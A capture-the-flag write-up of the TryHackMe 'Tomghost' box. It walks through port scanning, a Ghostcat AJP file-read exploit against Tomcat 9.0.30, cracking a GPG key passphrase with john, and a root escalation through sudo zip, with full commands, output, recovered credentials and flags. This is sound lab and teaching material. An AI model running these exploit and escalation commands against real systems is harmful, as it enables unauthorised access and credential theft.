---
date: 2024-10-23
title: Tomghost THM Write-Up
machine_ip: varies
os: Windows
difficulty: Easy
my_rating: 3
tags:
  - Linux
  - PrivEsc
  - Apache
  - GPG
  - tomcat
  - Ghostcat
  - john
  - ssh
  - FTP
  - AJP
  - gpg2john
  - GTFOBins
references: "[[📚CTF Box Writeups]]"
---

# Enumeration


- Rustscan
```
┌──(root㉿kali)-[~/Transfer]
└─# rustscan -a 10.10.133.121 -t 2000 -b 2000 -- -A -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.133.121:22
Open 10.10.133.121:53
Open 10.10.133.121:8009
Open 10.10.133.121:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.133.121
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 11:02 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:02
Completed NSE at 11:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:02
Completed NSE at 11:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:02
Completed NSE at 11:02, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:02
Completed Parallel DNS resolution of 1 host. at 11:02, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:02
Scanning 10.10.133.121 [4 ports]
Discovered open port 8009/tcp on 10.10.133.121
Discovered open port 53/tcp on 10.10.133.121
Discovered open port 8080/tcp on 10.10.133.121
Discovered open port 22/tcp on 10.10.133.121
Completed SYN Stealth Scan at 11:02, 0.19s elapsed (4 total ports)
Initiating Service scan at 11:02
Scanning 4 services on 10.10.133.121
Completed Service scan at 11:03, 7.72s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.133.121
Retrying OS detection (try #2) against 10.10.133.121
Initiating Traceroute at 11:03
Completed Traceroute at 11:03, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:03
Completed Parallel DNS resolution of 2 hosts. at 11:03, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.133.121.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 5.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.68s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
Nmap scan report for 10.10.133.121
Host is up, received user-set (0.16s latency).
Scanned at 2024-10-23 11:02:56 PDT for 21s

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
53/tcp   open  tcpwrapped syn-ack ttl 61
8009/tcp open  ajp13      syn-ack ttl 61 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       syn-ack ttl 61 Apache Tomcat 9.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.4 (96%), Linux 3.10 - 3.13 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Linux 3.12 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/23%OT=22%CT=%CU=40926%PV=Y%DS=4%DC=T%G=N%TM=67193A65%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)
SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 204.567 days (since Mon Apr  1 21:27:24 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8009/tcp)
HOP RTT       ADDRESS
1   37.39 ms  10.2.0.1
2   ... 3
4   167.58 ms 10.10.133.121

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.73 seconds
           Raw packets sent: 72 (4.800KB) | Rcvd: 43 (3.212KB)
```
- We see #ssh and #Apache services running

- Web enumeration
	- feroxbuster - directories/files
```
┌──(root㉿kali)-[~/Transfer]
└─# feroxbuster -r -k --url http://10.10.133.121:8080
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.133.121:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       62w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      351l      786w     5581c http://10.10.133.121:8080/tomcat.css
403      GET       83l      433w     3446c http://10.10.133.121:8080/manager/html
403      GET       73l      389w     3022c http://10.10.133.121:8080/host-manager/html
200      GET      207l     1277w    14954c http://10.10.133.121:8080/docs/setup.html
```
- Returns many directories, `docs`, `manager`, `host-manager`, and `examples`
 
- whatweb
```
┌──(root㉿kali)-[~/Transfer]
└─# whatweb http://10.10.133.121:8080
http://10.10.133.121:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.133.121], Title[Apache Tomcat/9.0.30]
```
- Apache Tomcat/9.0.30

- We find a `FORM Authentication` link in `JSP Examples` `http://10.10.133.121:8080/examples/jsp/security/protected/index.jsp`
	- Brings us to a login page

- Searching for Apache Tomcat 9.0.30 we find an [exploit](https://www.exploit-db.com/exploits/48143) which is labeled 'Ghostcat'... the box is 'Tomghost' 
	- Think it is safe to say this is our way in. But using this [exploit](https://github.com/00theway/Ghostcat-CNVD-2020-10487) seems to work better.
	- This exploit will target the AJP port (8009) running on the machine and allow anyone to read any files, may find some juicy info
	- Following an article on this exploit, we should try to read `/WEB-INF/web.xml`
```
┌──(root㉿kali)-[~/Transfer]
└─# python3 ajpShooter.py http://10.10.133.121:8080/ 8009 /WEB-INF/web.xml read
/root/Transfer/ajpShooter.py:361: SyntaxWarning: invalid escape sequence '\ '
  print('''

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```
- It looks like we find creds `skyfuck:8730281lkjlkjdqlksalks`

---
# Foothold

- gain shell via exploit
```
┌──(root㉿kali)-[~/Transfer]
└─# ssh skyfuck@10.10.133.121      
The authenticity of host '10.10.133.121 (10.10.133.121)' can't be established.
RSA key fingerprint is SHA256:F24EiOMx925vu1aOYErF12WH7rwcyvnWHF4Rj1hFOa8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.133.121' (RSA) to the list of known hosts.
skyfuck@10.10.133.121's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ whoami
skyfuck
```
- Looks like those creds worked for #ssh login!

- User flag - merlin
```
skyfuck@ubuntu:/home/merlin$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

- Pivot to merlin from skyfuck
- we find `tryhackme.asc` with PGP private key inside and a `credentials.pgp`
- I transfer them to my LHOST using #ftp server hosted on LHOST and connecting from RHOST to `put` the files on my machine. Easier analysis
	- need a passphrase for `tryhackme.asc`
	- Use #gpg2john to convert passphrase to a hash we can crack with #john
 ```
┌──(root㉿kali)-[~]
└─# gpg2john tryhackme.asc > hash

File tryhackme.asc
                                                                                
┌──(root㉿kali)-[~]
└─# cat hash       
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash         
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2024-10-23 13:02) 14.28g/s 15342p/s 15342c/s 15342C/s theresa..trisha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- `alexandru` is cracked as the password for the `tryhackme.asc` file
- Now we can use that password to import the secret key using #GPG to `tryhackme.asc` to load secret key
```
┌──(root㉿kali)-[~]
└─# gpg --import tryhackme.asc 
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: WARNING: server 'gpg-agent' is older than us (2.2.43 < 2.2.44)
gpg: Note: Outdated servers may lack important security fixes.
gpg: Note: Use the command "gpgconf --kill all" to restart them.
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

```
- Now we decrypt the `credentials.pgp` file using the secret key `alexandru`
```
┌──(root㉿kali)-[~]
└─# gpg --decrypt credential.pgp
gpg: WARNING: server 'gpg-agent' is older than us (2.2.43 < 2.2.44)
gpg: Note: Outdated servers may lack important security fixes.
gpg: Note: Use the command "gpgconf --kill all" to restart them.
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j  
```
- We now have the user `merlin`'s credentials 
	- `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`


- We are now #ssh to the machine using merlins login
```
┌──(root㉿kali)-[~]
└─# ssh merlin@10.10.133.121       
merlin@10.10.133.121's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ whoami
merlin
```

---
# PrivEsc

- escalate to root
- Enumerating #sudo privileges of merlin user
```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

- Using GTFO bins we find a quick priv esc attack path
```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
```

- Root flag
```
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```
